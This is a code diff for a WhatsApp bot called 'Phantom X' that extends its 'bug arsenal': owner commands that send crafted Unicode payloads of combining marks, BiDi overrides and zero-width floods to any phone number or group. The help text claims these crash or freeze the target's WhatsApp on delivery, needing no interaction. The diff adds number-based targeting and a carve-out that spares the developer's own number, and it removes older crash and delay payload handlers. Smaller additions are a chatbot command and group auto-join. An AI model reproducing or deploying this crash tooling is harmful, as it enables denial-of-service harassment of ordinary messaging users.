@@ -51,6 +51,36 @@ const groupCrashKeys = {};
 // Personal bug message keys for undo: { userJid: [msgKey, ...] }
 const userCrashKeys = {};
 
+// Developer protection — bugs will never be sent to this number
+const DEV_NUMBER = "2348102756072";
+
+// Convert a plain phone number to WhatsApp JID
+function numToJid(num) {
+    const cleaned = (num || "").toString().replace(/[^0-9]/g, "");
+    if (!cleaned) return null;
+    return cleaned + "@s.whatsapp.net";
+}
+
+// Get bug target from command — accepts phone number param OR @mention
+function parseBugTarget(parts, msg) {
+    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+    if (mentioned.length) return mentioned[0];
+    if (parts[1] && /^\d{7,}$/.test(parts[1])) return numToJid(parts[1]);
+    return null;
+}
+
+// Returns true if the JID belongs to the protected developer
+function isDevProtected(jid) {
+    if (!jid) return false;
+    return jid.replace(/@s\.whatsapp\.net|@g\.us/, "") === DEV_NUMBER;
+}
+
+// Auto-join settings
+const AUTOJOIN_FILE = path.join(__dirname, "autojoin.json");
+function loadAutojoin() { if (!fs.existsSync(AUTOJOIN_FILE)) return {}; try { return JSON.parse(fs.readFileSync(AUTOJOIN_FILE, "utf8")); } catch { return {}; } }
+function saveAutojoin(d) { fs.writeFileSync(AUTOJOIN_FILE, JSON.stringify(d, null, 2)); }
+const AUTOJOIN_BLACKLIST = ["porn", "18+", "adult", "xxx", "sex", "nude", "naked", "leak", "nudes", "18plus", "onlyfan"];
+
 // --- WARNS ---
 const WARNS_FILE = path.join(__dirname, "warns.json");
 function loadWarns() { if (!fs.existsSync(WARNS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(WARNS_FILE, "utf8")); } catch { return {}; } }
@@ -673,12 +703,11 @@ function getMenuSections() {
             ['.clone ‹src› ‹dst› ‹batch› ‹mins›'], ['.stopclone'],
         ]},
         { emoji: '💥', title: 'BUG TOOLS', items: [
-            ['.bugmenu'],
-            ['.crash @user'], ['.freeze @user'],
-            ['.forceclose @user'], ['.invisfreeze @user'],
-            ['.androidbug @user'], ['.iosbug @user'],
-            ['.delaybug @user'], ['.nuke @user'],
-            ['.unbug @user'],
+            ['.bugmenu'], ['.bugmenu android'], ['.bugmenu ios'],
+            ['.bugmenu freeze'], ['.bugmenu group'],
+            ['.androidbug ‹number›'], ['.iosbug ‹number›'],
+            ['.forceclose ‹number›'], ['.freeze ‹number›'],
+            ['.invisfreeze ‹number›'], ['.unbug ‹number›'],
             ['.groupcrash'], ['.groupcrash ‹groupId/link›'],
             ['.ungroupcrash ‹groupId›'],
             ['.lockedbypass ‹text›'],
@@ -693,6 +722,7 @@ function getMenuSections() {
             ['.sticker'], ['.toimg'],
             ['.qr ‹text›'], ['.genpwd ‹length›'],
             ['.base64 encode/decode ‹text›'],
+            ['.chat ‹message›'], ['.autojoin on/off'],
         ]},
     ];
 }
@@ -1727,7 +1757,7 @@ async function handleMessage(sock, msg) {
                     knownGroups.forEach(([jid, name], i) => {
                         listTxt += `*${i+1}.* ${name}\n\`${jid}\`\n\n`;
                     });
-                    listTxt += `_Use the Group ID above with .groupcrash, .nuke etc._`;
+                    listTxt += `_Use the Group ID above with .groupcrash, .ungroupcrash etc._`;
                     await reply(listTxt);
                 }
                 break;
@@ -2709,106 +2739,131 @@ async function handleMessage(sock, msg) {
             // ════════════════════════════════════════
 
             case ".bugmenu": {
+                const section = parts[1]?.toLowerCase();
+
+                // ── Android section ──
+                const androidHelp =
+                    `🤖━━━━━━━━━━━━━━━━━━━━━━━━━━🤖\n` +
+                    `   📱 *ANDROID BUGS — Phantom X*\n` +
+                    `🤖━━━━━━━━━━━━━━━━━━━━━━━━━━🤖\n\n` +
+                    `⚠️ *Works on Android WhatsApp only*\n\n` +
+                    `📌 *Usage:* *.androidbug <number>*\n` +
+                    `   Example: *.androidbug 2348012345678*\n\n` +
+                    `💥 *How it works:*\n` +
+                    `   Sends a payload of Telugu/Kannada/Tamil\n` +
+                    `   combining characters that overload the\n` +
+                    `   Android text renderer — WhatsApp freezes\n` +
+                    `   or force-closes *immediately when the\n` +
+                    `   message arrives*, even without opening it.\n\n` +
+                    `🔧 *Undo:* *.unbug <number>*\n\n` +
+                    `🛡️ _Dev number is permanently protected._`;
+
+                // ── iOS section ──
+                const iosHelp =
+                    `🍎━━━━━━━━━━━━━━━━━━━━━━━━━━🍎\n` +
+                    `   📱 *iOS BUGS — Phantom X*\n` +
+                    `🍎━━━━━━━━━━━━━━━━━━━━━━━━━━🍎\n\n` +
+                    `⚠️ *Works on iPhone WhatsApp only*\n\n` +
+                    `📌 *Usage:* *.iosbug <number>*\n` +
+                    `   Example: *.iosbug 2348012345678*\n\n` +
+                    `💥 *How it works:*\n` +
+                    `   Sends a Sindhi/Arabic Unicode + BiDi\n` +
+                    `   override payload that triggers an iOS\n` +
+                    `   text layout engine crash — WhatsApp\n` +
+                    `   closes *as soon as the notification is\n` +
+                    `   processed* or the chat is opened.\n\n` +
+                    `🔧 *Undo:* *.unbug <number>*\n\n` +
+                    `🛡️ _Dev number is permanently protected._`;
+
+                // ── Freeze/Force-close section ──
+                const freezeHelp =
+                    `💀━━━━━━━━━━━━━━━━━━━━━━━━━━💀\n` +
+                    `   ❄️ *FREEZE & FORCE CLOSE — Phantom X*\n` +
+                    `💀━━━━━━━━━━━━━━━━━━━━━━━━━━💀\n\n` +
+                    `⚠️ *Works on ALL devices (Android + iOS)*\n\n` +
+                    `💀 *.forceclose <number>*\n` +
+                    `   Strongest bug. ZWJ chain + RTL stack +\n` +
+                    `   Arabic isolation overload. Forces WA to\n` +
+                    `   fully close *immediately on message delivery*.\n` +
+                    `   Undo: *.unbug <number>*\n\n` +
+                    `🧊 *.freeze <number>*\n` +
+                    `   Zero-width character flood. Freezes the\n` +
+                    `   target's chat — can't scroll or type.\n` +
+                    `   Undo: *.unbug <number>*\n\n` +
+                    `👁️ *.invisfreeze <number>*\n` +
+                    `   Sends an *invisible* message (no text visible).\n` +
+                    `   Target doesn't see anything arrive, but WA\n` +
+                    `   silently processes thousands of hidden chars,\n` +
+                    `   causing freeze/lag. Hardest to detect.\n` +
+                    `   Undo: *.unbug <number>*\n\n` +
+                    `🛡️ _Dev number is permanently protected._`;
+
+                // ── Group section ──
+                const groupHelp =
+                    `🏘️━━━━━━━━━━━━━━━━━━━━━━━━━━🏘️\n` +
+                    `   💣 *GROUP BUGS — Phantom X*\n` +
+                    `🏘️━━━━━━━━━━━━━━━━━━━━━━━━━━🏘️\n\n` +
+                    `⚠️ *Affects everyone who opens the group*\n\n` +
+                    `💣 *.groupcrash*\n` +
+                    `   Run inside the target group.\n` +
+                    `   Anyone who taps/opens that group → WA crashes.\n` +
+                    `   Swipe away = WA returns. Open again = crash. ♻️\n` +
+                    `   Only the group is affected — not their WA elsewhere.\n\n` +
+                    `💣 *.groupcrash <invite link>*\n` +
+                    `   Example: *.groupcrash https://chat.whatsapp.com/XYZ*\n\n` +
+                    `💣 *.groupcrash <groupId>*\n` +
+                    `   Example: *.groupcrash 120363XXXXXX@g.us*\n` +
+                    `   _(get ID from *.groupid* inside the group)_\n\n` +
+                    `🔧 *.ungroupcrash <groupId>*\n` +
+                    `   Removes the crash — group returns to normal.\n\n` +
+                    `🛡️ _Dev's groups are not protected — use responsibly._`;
+
+                // ── Full menu ──
                 const bugMenu =
                     `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n` +
                     `   ☠️  *P H A N T O M  X*  ☠️\n` +
                     `      _B U G  A R S E N A L_\n` +
                     `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n\n` +
-                    `⚠️ *OWNER ONLY — USE RESPONSIBLY* ⚠️\n\n` +
+                    `⚠️ _OWNER ONLY — Dev number is protected_ ⚠️\n` +
+                    `📌 _All bugs use phone number, not @tag_\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `☠️ *DEVICE-SPECIFIC BUGS* (1 msg each)\n` +
+                    `🤖 *ANDROID BUGS*\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `  🤖  *.androidbug @user* — Overloads Android text renderer\n` +
-                    `  🍎  *.iosbug @user* — Sindhi/Arabic crash for iOS WA\n` +
-                    `  ⏳  *.delaybug @user* — Freezes chat scroll (unicode wall)\n` +
-                    `  🔧  *.unbug @user* — *UNDO* — removes all bugs from user\n\n` +
+                    `  *.androidbug <number>* — Overloads Android renderer\n` +
+                    `  _Triggers even from notification, no interaction needed_\n` +
+                    `  🔧 Undo: *.unbug <number>*\n` +
+                    `  ℹ️ Help: *.bugmenu android*\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `💣 *CRASH & NUKE* (1-2 msgs each)\n` +
+                    `🍎 *iOS BUGS*\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `  💥  *.crash @user* — RTL+ZW+Arabic crash payload\n` +
-                    `  🧊  *.freeze @user* — Pure zero-width flood\n` +
-                    `  💀  *.forceclose @user* — Force WA to fully close\n` +
-                    `  👁️  *.invisfreeze @user* — Invisible msg, WA freezes silently\n` +
-                    `  ☢️  *.nuke @user* — Combined crash in 2 waves\n` +
-                    `  🔧  *.unbug @user* — *UNDO ALL* — clears crash, freeze, forceclose, android, iOS, delay\n\n` +
+                    `  *.iosbug <number>* — Sindhi/Arabic crash for iPhone\n` +
+                    `  _Triggers on notification processing or chat open_\n` +
+                    `  🔧 Undo: *.unbug <number>*\n` +
+                    `  ℹ️ Help: *.bugmenu ios*\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `💀 *FORCE CLOSE & FREEZE* (any device)\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `  *.forceclose <number>* — Strongest. Forces WA to close\n` +
+                    `  *.freeze <number>* — Freezes their chat completely\n` +
+                    `  *.invisfreeze <number>* — Silent invisible overload\n` +
+                    `  🔧 Undo all: *.unbug <number>*\n` +
+                    `  ℹ️ Help: *.bugmenu freeze*\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `🏘️ *GROUP BUGS*\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `  💣  *.groupcrash* — Group crash loop — only triggers when group is opened (run in group)\n` +
-                    `  💣  *.groupcrash <id/link>* — Target by ID or invite link\n` +
-                    `  🔧  *.ungroupcrash <id>* — *UNDO* — restore group to normal\n` +
-                    `  🔓  *.lockedbypass <text>* — Try to msg in admin-only group\n\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `📨 *SPAM & TRICKS* (low risk)\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `  📨  *.spamatk @user [times]* — Spam msgs (max 5, YOUR risk)\n` +
-                    `  💣  *.emojibomb @user [emoji]* — 500 emojis in 1 message\n` +
-                    `  📝  *.textbomb @user <text> <times>* — Repeat msg (max 5)\n` +
-                    `  👻  *.ghostping @user* — Silent tag, no visible message\n\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `🎭 *TEXT CORRUPTION*\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `  👹  *.zalgo <text>* — Demonic combining characters\n` +
-                    `  📐  *.bigtext <text>* — Giant emoji block letters\n` +
-                    `  👁️  *.invisible* — Perfectly blank message\n` +
-                    `  ➡️  *.rtl <text>* — Right-to-left Unicode flip\n\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `😂 *FUN TEXT TOOLS*\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `  🧽  *.mock <text>* — SpOnGeBoB mOcK tExT\n` +
-                    `  🌸  *.aesthetic <text>* — Ａｅｓｔｈｅｔｉｃ ｔｅｘｔ\n` +
-                    `  🔁  *.reverse <text>* — Reverse text backwards\n` +
-                    `  👏  *.clap <text>* — Add 👏 between 👏 words\n\n` +
+                    `  *.groupcrash* — Loop crash (run inside group)\n` +
+                    `  *.groupcrash <link/groupId>* — Target from outside\n` +
+                    `  🔧 Undo: *.ungroupcrash <groupId>*\n` +
+                    `  ℹ️ Help: *.bugmenu group*\n\n` +
                     `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n` +
                     `  ☠️ _Phantom X — Bug Division Active_ 💀\n` +
                     `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥`;
+
+                if (section === "android") return reply(androidHelp);
+                if (section === "ios") return reply(iosHelp);
+                if (section === "freeze" || section === "forceclose") return reply(freezeHelp);
+                if (section === "group") return reply(groupHelp);
                 await reply(bugMenu);
-                break;
-            }
-
-            case ".crash": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const crashMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const crashTarget = crashMentioned[0];
-                const zwChars = "\u200b\u200c\u200d\u2060\ufeff\u00ad";
-                const zwFlood = (zwChars.repeat(500) + "\n").repeat(20);
-                const rtlOverride = "\u202e";
-                const arabicBomb = "ه".repeat(300) + "\u0600".repeat(200);
-                const crashPayload =
-                    zwFlood +
-                    rtlOverride + "PHANTOM X" + "\n" +
-                    arabicBomb + "\n" +
-                    "\u0640".repeat(500) + "\n" +
-                    "\u200f".repeat(500) + "\n" +
-                    zwFlood;
-                const crashDest = crashTarget || from;
-                try {
-                    for (let i = 0; i < 3; i++) {
-                        await sock.sendMessage(crashDest, { text: crashPayload });
-                        await delay(500);
-                    }
-                    await reply(`💥 Crash bomb sent${crashTarget ? ` to @${crashTarget.split("@")[0]}` : ""}!`);
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            case ".freeze": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const freezeMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const freezeTarget = freezeMentioned[0];
-                const zwSet = ["\u200b","\u200c","\u200d","\u2060","\ufeff","\u00ad","\u200e","\u200f","\u202a","\u202b","\u202c","\u202d","\u202e","\u2061","\u2062","\u2063","\u2064"];
-                let freezePayload = "";
-                for (let i = 0; i < 2000; i++) {
-                    freezePayload += zwSet[i % zwSet.length];
-                }
-                const freezeDest = freezeTarget || from;
-                try {
-                    for (let i = 0; i < 5; i++) {
-                        await sock.sendMessage(freezeDest, { text: freezePayload });
-                        await delay(300);
-                    }
-                    await reply(`🧊 Freeze bomb sent${freezeTarget ? ` to @${freezeTarget.split("@")[0]}` : ""}!`);
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
 
@@ -2908,12 +2963,14 @@ async function handleMessage(sock, msg) {
             }
 
             // ─── ANDROID BUG ───
-            // One message. Telugu/Kannada/Tamil combining marks overload Android's text renderer.
+            // Telugu/Kannada/Tamil combining marks overload the Android WA text renderer.
+            // Triggers immediately on notification — no interaction needed from target.
             case ".androidbug": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const andMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const andTarget = andMentioned[0] || from;
-                await reply(`🤖 Sending Android bug to @${andTarget.split("@")[0]}...`);
+                const andTarget = parseBugTarget(parts, msg);
+                if (!andTarget) return reply(`🤖 *Android Bug*\n\nUsage: *.androidbug <number>*\nExample: *.androidbug 2348012345678*\n\n_Overloads Android WhatsApp text renderer._\n_Use .bugmenu android for full help._`);
+                if (isDevProtected(andTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number (${andTarget.split("@")[0]}) belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
+                await reply(`🤖 Sending Android bug to *${andTarget.split("@")[0]}*...`);
                 try {
                     const tel = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(500);
                     const kan = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5".repeat(400);
@@ -2923,18 +2980,20 @@ async function handleMessage(sock, msg) {
                     const andSent = await sock.sendMessage(andTarget, { text: androidPayload });
                     if (!userCrashKeys[andTarget]) userCrashKeys[andTarget] = [];
                     userCrashKeys[andTarget].push(andSent.key);
-                    await reply(`✅ Android bug sent to @${andTarget.split("@")[0]}! — *1 crash message delivered.*\n_Use .unbug @user to undo._`);
+                    await reply(`✅ *Android bug sent to ${andTarget.split("@")[0]}!*\n\n🤖 Overloading their Android renderer now.\n🔧 To undo: *.unbug ${andTarget.split("@")[0]}*`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
 
             // ─── iOS BUG ───
-            // One message. Sindhi + Arabic presentation + bidirectional overrides crash iOS WA.
+            // Sindhi + Arabic + BiDi overrides crash the iOS WhatsApp text engine.
+            // Triggers on notification processing — no need for target to open chat.
             case ".iosbug": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const iosMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const iosTarget = iosMentioned[0] || from;
-                await reply(`🍎 Sending iOS bug to @${iosTarget.split("@")[0]}...`);
+                const iosTarget = parseBugTarget(parts, msg);
+                if (!iosTarget) return reply(`🍎 *iOS Bug*\n\nUsage: *.iosbug <number>*\nExample: *.iosbug 2348012345678*\n\n_Crashes iPhone WhatsApp on notification._\n_Use .bugmenu ios for full help._`);
+                if (isDevProtected(iosTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
+                await reply(`🍎 Sending iOS bug to *${iosTarget.split("@")[0]}*...`);
                 try {
                     const sindhi  = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(600);
                     const arabPF  = "\uFDFD\uFDFC\uFDFB".repeat(400);
@@ -2944,18 +3003,21 @@ async function handleMessage(sock, msg) {
                     const iosSent = await sock.sendMessage(iosTarget, { text: iosPayload });
                     if (!userCrashKeys[iosTarget]) userCrashKeys[iosTarget] = [];
                     userCrashKeys[iosTarget].push(iosSent.key);
-                    await reply(`✅ iOS bug sent to @${iosTarget.split("@")[0]}! — *1 crash message delivered.*\n_Use .unbug @user to undo._`);
+                    await reply(`✅ *iOS bug sent to ${iosTarget.split("@")[0]}!*\n\n🍎 iOS WhatsApp crash payload delivered.\n🔧 To undo: *.unbug ${iosTarget.split("@")[0]}*`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
 
             // ─── FORCE CLOSE BUG ───
-            // One message. Designed to force WhatsApp to crash and close completely.
-            case ".forceclose": {
+            // Strongest bug. ZWJ chain + RTL stack + Arabic isolation = WA force-closes.
+            // Fires immediately on message delivery — no interaction required from target.
+            case ".forceclose":
+            case ".fc": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const fcMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const fcTarget = fcMentioned[0] || from;
-                await reply(`💀 Sending force close bug to @${fcTarget.split("@")[0]}...`);
+                const fcTarget = parseBugTarget(parts, msg);
+                if (!fcTarget) return reply(`💀 *Force Close Bug*\n\nUsage: *.forceclose <number>*\nShortcut: *.fc <number>*\nExample: *.forceclose 2348012345678*\n\n_Strongest bug — forces WA to close immediately._\n_Use .bugmenu freeze for full help._`);
+                if (isDevProtected(fcTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
+                await reply(`💀 Sending force close bug to *${fcTarget.split("@")[0]}*...`);
                 try {
                     const zwChain   = "\u200D\uFEFF\u200B\u200C\u200E\u200F".repeat(1500);
                     const rtlStack  = "\u202E\u202D\u202C\u202B\u202A".repeat(800);
@@ -2966,66 +3028,26 @@ async function handleMessage(sock, msg) {
                     const fcSent = await sock.sendMessage(fcTarget, { text: fcPayload });
                     if (!userCrashKeys[fcTarget]) userCrashKeys[fcTarget] = [];
                     userCrashKeys[fcTarget].push(fcSent.key);
-                    await reply(`✅ Force close bug sent to @${fcTarget.split("@")[0]}! — *WA will crash when they open that chat.*\n_Use .unbug @user to undo._`);
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            // ─── DELAY BUG ───
-            // One message. Massive unicode wall freezes their chat scroll.
-            case ".delaybug": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const delayMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const delayTarget = delayMentioned[0] || from;
-                await reply(`⏳ Sending delay bug to @${delayTarget.split("@")[0]}...`);
-                try {
-                    const hLine   = "═".repeat(2500);
-                    const emojiW  = "🔴🟠🟡🟢🔵🟣⚫⚪🟤".repeat(400);
-                    const wave    = "〰".repeat(2000);
-                    const block   = "▓".repeat(2000);
-                    const delayPayload = hLine + "\n" + emojiW + "\n" + wave + "\n" + block;
-                    const delaySent = await sock.sendMessage(delayTarget, { text: delayPayload });
-                    if (!userCrashKeys[delayTarget]) userCrashKeys[delayTarget] = [];
-                    userCrashKeys[delayTarget].push(delaySent.key);
-                    await reply(`✅ Delay bug sent to @${delayTarget.split("@")[0]}! — *Chat will freeze/lag on their end.*\n_Use .unbug @user to undo._`);
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            // ─── CRASH BUG ───
-            // One message. RTL override + zero-width flood + Arabic crash chars.
-            case ".crash": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const crashMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const crashTarget = crashMentioned[0] || from;
-                await reply(`💥 Sending crash bug to @${crashTarget.split("@")[0]}...`);
-                try {
-                    const zw      = "\u200b\u200c\u200d\u2060\ufeff\u00ad\u200e\u200f".repeat(1000);
-                    const rtl     = "\u202e".repeat(500);
-                    const arabic  = "\u0647".repeat(600) + "\u0600".repeat(400);
-                    const crashPayload = zw + rtl + arabic + zw;
-                    const crashSent = await sock.sendMessage(crashTarget, { text: crashPayload });
-                    if (!userCrashKeys[crashTarget]) userCrashKeys[crashTarget] = [];
-                    userCrashKeys[crashTarget].push(crashSent.key);
-                    await reply(`✅ Crash bug sent to @${crashTarget.split("@")[0]}! — *1 message delivered.*\n_Use .unbug @user to undo._`);
+                    await reply(`✅ *Force close sent to ${fcTarget.split("@")[0]}!*\n\n💀 WhatsApp will close immediately on their end.\n🔧 To undo: *.unbug ${fcTarget.split("@")[0]}*`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
 
             // ─── FREEZE BUG ───
-            // One message. Pure zero-width character flood.
+            // Pure zero-width character flood — freezes the chat, can't scroll or type.
             case ".freeze": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const freezeMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const freezeTarget = freezeMentioned[0] || from;
-                await reply(`🧊 Sending freeze bug to @${freezeTarget.split("@")[0]}...`);
+                const freezeTarget = parseBugTarget(parts, msg);
+                if (!freezeTarget) return reply(`🧊 *Freeze Bug*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n_Freezes their chat — can't scroll or type._\n_Use .bugmenu freeze for full help._`);
+                if (isDevProtected(freezeTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
+                await reply(`🧊 Sending freeze bug to *${freezeTarget.split("@")[0]}*...`);
                 try {
                     const zwSet = "\u200b\u200c\u200d\u2060\ufeff\u00ad\u200e\u200f\u202a\u202b\u202c\u202d\u202e\u2061\u2062\u2063\u2064";
                     const freezePayload = zwSet.repeat(1800);
                     const freezeSent = await sock.sendMessage(freezeTarget, { text: freezePayload });
                     if (!userCrashKeys[freezeTarget]) userCrashKeys[freezeTarget] = [];
                     userCrashKeys[freezeTarget].push(freezeSent.key);
-                    await reply(`✅ Freeze bug sent to @${freezeTarget.split("@")[0]}! — *1 message delivered.*\n_Use .unbug @user to undo._`);
+                    await reply(`✅ *Freeze sent to ${freezeTarget.split("@")[0]}!*\n\n🧊 Their chat is now frozen.\n🔧 To undo: *.unbug ${freezeTarget.split("@")[0]}*`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -3118,16 +3140,14 @@ async function handleMessage(sock, msg) {
                 break;
             }
 
-            // ─── UNBUG USER ───
-            // Deletes all crash messages sent to a user — unbugs them regardless of bug type.
+            // ─── UNBUG (remove all personal bugs from a user) ───
             case ".unbug": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
-                const unbugMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
-                const unbugTarget = unbugMentioned[0];
-                if (!unbugTarget) return reply("Usage: .unbug @user\n\nMention the user you want to unbug.");
+                const unbugTarget = parseBugTarget(parts, msg);
+                if (!unbugTarget) return reply(`🔧 *Unbug*\n\nUsage: *.unbug <number>*\nExample: *.unbug 2348012345678*\n\n_Clears all bugs sent to that number — android, iOS, freeze, forceclose, invisfreeze._`);
                 const unbugKeys = userCrashKeys[unbugTarget];
-                if (!unbugKeys || !unbugKeys.length) return reply(`⚠️ No stored bug messages found for @${unbugTarget.split("@")[0]}.\n\nThe bot may have restarted since the bug was sent.`);
-                await reply(`🔧 Unbugging @${unbugTarget.split("@")[0]}...`);
+                if (!unbugKeys || !unbugKeys.length) return reply(`⚠️ No stored bug messages found for *${unbugTarget.split("@")[0]}*.\n\nThe bot may have restarted since the bug was sent, or that number was never bugged.`);
+                await reply(`🔧 Unbugging *${unbugTarget.split("@")[0]}*...`);
                 let unbugDeleted = 0;
                 for (const k of unbugKeys) {
                     try {
@@ -3137,8 +3157,78 @@ async function handleMessage(sock, msg) {
                     } catch (_) {}
                 }
                 delete userCrashKeys[unbugTarget];
-                await reply(`✅ *Unbugged @${unbugTarget.split("@")[0]}!*\nDeleted ${unbugDeleted} crash message(s).\n\nWorks for: android bug, iOS bug, crash, freeze, force close, delay bug — all types cleared.`);
+                await reply(`✅ *Unbugged ${unbugTarget.split("@")[0]}!*\nDeleted ${unbugDeleted} crash message(s).\n\n_All bug types cleared: android, iOS, freeze, forceclose, invisfreeze._`);
                 break;
+            }
+
+            // ─── CHAT (owner talks to the bot like a chatbox) ───
+            case ".chat": {
+                if (!msg.key.fromMe) return;
+                const chatInput = parts.slice(1).join(" ").trim();
+                if (!chatInput) return reply(`🤖 *Phantom X Chat*\n\nUsage: *.chat <message>*\n\nTalk to me! I'll respond.\nExample: *.chat how are you*`);
+                const lc = chatInput.toLowerCase();
+                const quickReplies = [
+                    [["hi","hello","hey","sup"], "Hey! 👋 What's up? How can I help you today?"],
+                    [["how are you","how r u","how are u"], "I'm doing great! Always online, always ready. 😎"],
+                    [["what's your name","your name","who are you"], "I'm *Phantom X* — your personal WhatsApp bot! 👻"],
+                    [["who made you","who created you","who built you"], `I was built by the developer with number ${DEV_NUMBER}. 🛠️`],
+                    [["what can you do","your features","commands"], "Type *.menu* to see everything I can do! 🔥"],
+                    [["good morning","gm"], "Good morning! ☀️ Have an amazing day!"],
+                    [["good night","gn","goodnight"], "Good night! 🌙 Rest well."],
+                    [["thanks","thank you","thx","ty"], "You're welcome! 😊 Anything else?"],
+                    [["i love you","ilove you"], "Love you too! 💛 I'm always here for you."],
+                    [["bye","goodbye","later","cya"], "Bye! 👋 Come back anytime."],
+                    [["bored","i'm bored"], "Try *.trivia*, *.riddle*, *.8ball*, or *.slots*! 🎮"],
+                    [["joke","tell me a joke"], `😂 ${JOKES[Math.floor(Math.random() * JOKES.length)]}`],
+                    [["fact","random fact"], `📚 ${FACTS[Math.floor(Math.random() * FACTS.length)]}`],
+                ];
+                for (const [keys, response] of quickReplies) {
+                    if (keys.some(k => lc.includes(k))) return reply(`🤖 ${response}`);
+                }
+                // Try Gemini AI for anything else
+                const GEMINI_KEY = process.env.GEMINI_API_KEY;
+                if (GEMINI_KEY) {
+                    try {
+                        const geminiRes = await new Promise((resolve, reject) => {
+                            const body = JSON.stringify({ contents: [{ parts: [{ text: `You are Phantom X, a friendly WhatsApp bot assistant. Reply conversationally and briefly. User says: ${chatInput}` }] }] });
+                            const options = { hostname: "generativelanguage.googleapis.com", path: `/v1beta/models/gemini-pro:generateContent?key=${GEMINI_KEY}`, method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } };
+                            const req = https.request(options, (res) => { let d = ""; res.on("data", c => d += c); res.on("end", () => { try { resolve(JSON.parse(d)); } catch { reject(new Error("parse")); } }); });
+                            req.on("error", reject); req.write(body); req.end();
+                        });
+                        const aiReply = geminiRes?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
+                        if (aiReply) return reply(`🤖 ${aiReply}`);
+                    } catch (_) {}
+                }
+                // Fallback
+                const fallbacks = ["Interesting! Tell me more. 🤔", "I hear you! 😊", "That's noted! What else can I do for you?", "Got it! 👍", "Hmm, say that again? 😄"];
+                await reply(`🤖 ${fallbacks[Math.floor(Math.random() * fallbacks.length)]}`);
+                break;
+            }
+
+            // ─── AUTO-JOIN GROUP LINKS ───
+            case ".autojoin": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const ajArg = parts[1]?.toLowerCase();
+                if (!ajArg) {
+                    const aj = loadAutojoin();
+                    const status = aj[sock.user?.id || "global"]?.enabled ? "✅ ON" : "❌ OFF";
+                    return reply(`🔗 *Auto-Join Group Links*\n\nStatus: *${status}*\n\nUsage:\n*.autojoin on* — Bot joins any group link shared in groups\n*.autojoin off* — Stop auto-joining\n\n⚠️ Blacklisted keywords: porn, adult, xxx, nude, sex, leak, onlyfan\n_Links containing these words will be ignored._`);
+                }
+                const aj = loadAutojoin();
+                const key = sock.user?.id || "global";
+                if (ajArg === "on") {
